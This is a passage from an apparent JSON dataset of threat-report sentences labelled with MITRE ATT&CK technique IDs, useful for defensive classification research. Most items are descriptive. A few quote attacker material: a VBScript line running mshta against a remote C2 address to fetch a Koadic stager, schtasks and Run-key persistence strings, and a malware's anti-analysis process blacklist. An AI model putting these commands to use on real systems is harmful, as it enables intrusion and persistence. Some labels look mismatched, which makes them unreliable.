    ]
  },
  {
    "type": "text",
    "text": "can copy cmd.exe into the system temp folder.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "injects it into a process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download files from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has been seen deleting its own files and payloads to make analysis of the attack more difficult.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "A module in  collects information from the victim about its IP addresses and MAC addresses.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "creates a suspended svchost process and injects its DLL into it.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can determine the operating system and whether a targeted machine has a 32 or 64 bit architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has collected the hostname of a compromised machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can execute command line scripts received from C2.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "write a batch file to disk that executes the Fantasy wiper, and then run that batch file via PsExec with this command line string",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\.(Citation: FireEye APT37 Feb 2018)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "malware has used rundll32 to launch additional malicious components.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "actors obtained a list of active processes on the victim and sent them to C2 servers.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to collect the domain name on a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can execute rundll32.exe in memory to avoid detection.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "opened with the CreateLogFile() API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "modifies the Windows Registry to allow remote desktop connections",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "downloads and executes additional files from a remote server. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can inject a payload into the memory of a compromised host.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use CreateProcess to execute a process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute files.(Citation: jRAT Symantec Aug 2018)(Citation: Kaspersky Adwind Feb 2016)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used Nt*  functions to inject code into legitimate processes such as wermgr.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe to add a persistent service.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used a scheduled task to launch its PowerShell loader.(Citation: ESET ComRAT May 2020)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "It then sets registry entries",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "is capable of executing commands via cmd.exe.(Citation: Forcepoint Monsoon)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can be used to display ARP configuration information on the host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used  to find the public IP address of a compromised system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can execute remote commands via the command-line interface.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "to persist in target environments and deploy additional tools.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has been observed using a Registry Run key.(Citation: FireEye Know Your Enemy FIN8 Aug 2016)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the location public IP address and domain name on a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "cmd /C \"C: & cd \\ & systeminfo\"",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to inject code into the svchost.exe iexplorer.exe explorer.exe and default browser processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can use the Windows command line to delete volume shadow copies and disable recovery.(Citation: Cylance Sodinokibi July 2019)(Citation: Talos Sodinokibi April 2019)(Citation: Picus Sodinokibi January 2020)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can download files to specified targets.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "DLL is then executed using rundll32",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has used malware to obtain a list of running processes on the system.(Citation: Securelist MuddyWater Oct 2018)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Implant directory contained in the malicious Flash file",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download files from C2 to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can modify services by using the OpenService and ChangeServiceConfig functions. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "downloads and runs",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has gained execution through victims clicking on malicious LNK files contained within ISO files which can execute hidden DLLs within the ISO.(Citation: Google EXOTIC LILY March 2022)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used malicious e-mail attachments to lure victims into executing malware.(Citation: FireEye Obfuscation June 2017)(Citation: FireEye Fin8 May 2016)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "enumerate files and folders",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Backdoor.Pirpi also collects information about the target’s local network, including the domain controller and workstations",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The intrusion began when a user double clicked a LNK file, which then executed encoded Powershell commands",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can leverage API functions such as ShellExecuteA and HttpOpenRequestA in the process of downloading and executing files.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to control an infected PC using RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has used Windows API functions to install the service and shim.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The victim double clicks the ISO to mount it",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has a tool to add a Windows admin account in order to allow them to ensure continued access via RDP. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "HTTP by prepending the data with a hardcoded",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used administrative accounts including Domain Admin to move laterally within a victim network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "the hacker also injects malicious DLLs into the memory,",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe for execution. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has modules to interact with the Windows task scheduler.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can modify registry entries",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the computer name from the victim's system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Get Directory Information The malware gets information for the provided directory address using the following WINAPI calls:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "injects itself into explorer.exe",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can delete created files from a compromised system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used process hollowing shellcode to target a predefined list of processes from %SYSTEM32%.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "cyber actors have been observed deleting files using rm or del commands.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can leverage Windows services to escalate privileges from administrator to SYSTEM with the -s argument.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "modifying\nTerminal Server registry key values",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "During  PowerView's file share enumeration results were stored in the file `c:\\ProgramData\\found_shares.txt`.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has used hashdump  and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts.(Citation: FireEye APT41 Aug 2019)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Uses NtSetInformationThread API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Analysis of their configurations show that the C2 servers used both fully-qualified domain names and IP addresses",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated running processes on a compromised host to determine if it is running under the process name `dfrgui.exe`.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "StartDownload, StopDownload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A Linux version of  checks if the victim user ID is anything other than zero (normally used for root) and the malware will not execute if it does not have root privileges.  also gathers the username of the victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "\".bat\" files",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to execute ver and systeminfo commands.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can obtain data from local systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "a beacon injected into a single Rundll32.exe process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the username and account type.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can use  to execute commands on a victims machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has launched cmd.exe and used the ShellExecuteW() API function to execute commands on the system.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can check for the existence of files including its own components as well as retrieve a list of logical drives.(Citation: Symantec Trojan.Hydraq Jan 2010)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "These work in tandem to insert data into the Windows Registry",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "deletes content from C2 communications that was saved to the user's temporary directory.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It checks for the number of processors in the infected system",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The  3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list files and file characteristics including extension size ownership and permissions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence via the `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` registry key and by loading a dropper to `(%COMMON_ STARTUP%\\\\eoffice.exe)`.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can determine the IP addresses of domain controllers.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can open a remote command-line interface and execute commands.(Citation: PaloAlto NanoCore Feb 2016)  uses JavaScript files.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "stores configuration values under the Registry key HKCU\\Software\\Microsoft\\[dllname] and modifies Registry keys under HKCR\\CLSID\\...\\InprocServer32with a path to the launcher.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "A keylogging tool used by  gathers network information from the victim including the MAC address IP address WINS DHCP server and gateway.(Citation: Symantec Buckeye)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "creates the registry key",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike Beacon was dropped and executed on the system",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This threat actor abused access to accounts in the Cloud Solution Partner’s environment with legitimate delegated administrative privileges to then gain access to several customers’ O365 environments",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors often opened Internet Explorer to download their beacons",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "queried the Registry to identify victim information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has deleted logs and executable files used during an intrusion.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has injected code into trusted processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "4 Upload edg499.dat, which includes the list of interesting files",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "uses cmd.exe to execute itself in-memory.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used commands and API calls to gather system information.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 also moved laterally to servers in the environment using RDP and configured them as malware “distribution” servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After copying itself to a DLL file a variant of  calls the DLL file using rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "schtasks /Create /TN test /SC MINUTE /MO 15 /TR",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "its C2 server consists of JSON data exchanged via HTTP POST requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The method InjectAssembly is used to inject a .NET assembly into a native process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The malware implemented a series of Mimikatz modifications on closed-source tooling",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used Rundll32 to execute its loader for privilege escalation purposes.(Citation: Medium KONNI Jan 2020)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "malware can leverage the Windows API call CreateProcessA() for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "“win32_remote“,”win64_remote64“,”ollydbg“,”ProcessHacker“,”tcpview“,”autoruns“,”autorunsc“,”filemon“,”procmon“,”regmon“,”procexp“,”idaq“,”idaq64“,”ImmunityDebugger“,”Wireshark“,”dumpcap“,”HookExplorer“,”ImportREC“,”PETools“,”LordPE“,”dumpcap“,”SysInspector“,”proc_analyzer“,”sysAnalyzer“,”sniff_hit“,”windbg“,”joeboxcontrol“,”joeboxserver“  Blacklisted process names in the malware In some cases, it calculates the checksum of each running process name, and if it matches any hard-coded checksums, it causes a BSOD via the ntdll.dll “NtRaiseHardError” function",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "C2\nserver via a subsequent HTTP POST request",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can write its configuration file to the Registry.(Citation: Trend Micro DRBControl February 2020)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to load DLLs via reflective injection.(Citation: Talos Cobalt Strike September 2020)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "resolves the function\naddress for the ServiceMain export function",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "executes a binary on the system and logs the results into a temp file by using: cmd.exe /c <file_path> > %temp%\\PM* .tmp 2>&1.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can store its encryption key in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used a tool to capture the username on a compromised host in order to register it with C2.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "schedules tasks to run malicious scripts at different intervals.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "enable RDP connections.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate a list of running processes on a compromised machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate drives and list the contents of the C: drive on a victim's computer.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can check if the explorer.exe process is responsible for calling its install function.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "copies an executable payload to the target system by using  and then scheduling an unnamed task to execute the malware.(Citation: FireEye Shamoon Nov 2016)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Operators deploying  have used batch scripts to retrieve the  payload.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to discover the proxy configuration of Firefox and/or Opera.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can discover logical drive information including the drive type free space and volume information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can steal system information.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Current process ID",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can check `Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings` to extract the `ProxyServer` string.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "The backdoor periodically checks and creates its own persistence by making sure that Step 1 of the loader is run every time the system is started, via a registry Run value, in the same way as in the installer:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\<random_run_name>\\”%appdata%\\Python27({32|64})\\pythonw.exe” “<loader_step_1>” “<loader_encrypted_step_2>”",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has a command to inject code into a process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can download files remotely.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Downloading and running further executables",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "starts by enumerating *.blf files in the default user’s profile\ndirectory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "To evade detection, the threat actors disabled Windows Defender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "supports data upload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "and the use of valid accounts",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "downloading and executing",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has created a service named `Service1` for persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "It attempts to specifically gain root access to these devices via a default password",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has relied on a victim to enable malicious macros within an attachment delivered via email.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "collects the MAC address of the target computer and other network configuration information.(Citation: ESET Machete July 2019)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to leverage API including `GetProcAddress` and `LoadLibrary`.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "gathers volume drive information and system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "WMIC is a good tool for managing windows hosts and is widely favored by desktop administrators",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has a function to write itself to Registry values. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used lure documents to convince the user to enable macros. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "performs multiple process injections to hijack system processes and execute malicious code.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "tools have registered Run keys in the registry to give malicious VBS files persistence.(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "keyboard layout",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks named MSST and \\Microsoft\\Windows\\Autochk\\Scheduled to establish persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use HTTP for its C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can uninstall its loader through the use of a `Sdl` command.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can list the processes on the victims machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has a command to open a file manager and explorer on the system. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "adds persistence by creating Registry Run keys.(Citation: Talos Zeus Panda Nov 2017)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has created a cmd.exe reverse shell executed commands and uploaded output via the command line.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "On the next step this file is executed by rundll32.exe via the KlpSvc export",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "launched a scheduled task to gain persistence using the schtasks /create /sc command.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "to establish new services to enable persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The attackers enumerate drives, directories, and files",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It uses the esxcli command to list all VM processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can download files to the victims machine.(Citation: Fidelis njRAT June 2013)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "--remove       self remove this file after work",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has a command to upload information about all running processes to its C2 server.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used  to establish full remote control of the connected machine and run command-line shells.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "when the victim clicked on the LNK file, it triggered the execution of the batch file",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "“Display information about current Windows version",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The embedded VBScript is retrieved from a resource and decrypted using the same algorithm as discussed above, which results in the following cleartext:       set objshell = createobject(\\\"wscript.shell\\\")objshell.run \\\"mshta hxxp://86.106.131.177:6500/zIZFh\\\",vbhide     The Koadic C2 server will respond to this request with Javascript code that acts as the Koadic staging payload, which allows the actor to run additional Koadic modules on the end system to carry out their post-exploitation activities",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has lured users to open malicious email attachments.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "uses the tasklist to view running processes on the victims machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used legitimate credentials to hijack email communications.(Citation: FireEye Hacking FIN4 Dec 2014)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can query and kill system processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can check the Registry for specific keys.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "This technique is called self-injection or PE overwrite",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use the command shell to execute commands on a compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "creates two different scheduled tasks.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can upload files to the victims machine and can download additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can report the IP of the compromised host to attacker controlled infrastructure.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has been executed through malicious attachments contained in spearphishing emails.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "use powershell to download the payload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "backdoor has used cmd.exe to execute arbitrary commands as well as batch scripts to update itself to a newer version.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can store collected data from an infected host to a file named `Hostname_UserName.txt` prior to exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has used a Batch file to automate frequently executed post compromise cleanup activities.(Citation: FireEye Know Your Enemy FIN8 Aug 2016)  has also executed commands remotely via .(Citation: FireEye Obfuscation June 2017)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Process manager (browses and terminates processes)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can browse file systems.(Citation: Kaspersky Adwind Feb 2016)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "For example, in the previous variant of BADNEWS, the victim’s unique identifier was stored under a variable named ‘uid’, the username was stored in a variable named ‘u’, etc",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries paths and configs.(Citation: GitHub PowerSploit May 2012)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can run  to gather information about the victim.(Citation: ESET Sednit Part 2)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can query the Registry to get random file extensions to append to encrypted files.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTPS to download files.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use an arbitrary system service to load at system boot for persistence and replaces the ImagePath registry value of a Windows service with a new backdoor binary. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has been observed enumerating local processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used batch scripts in its malware to install persistence mechanisms.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can communicate using HTTP or HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
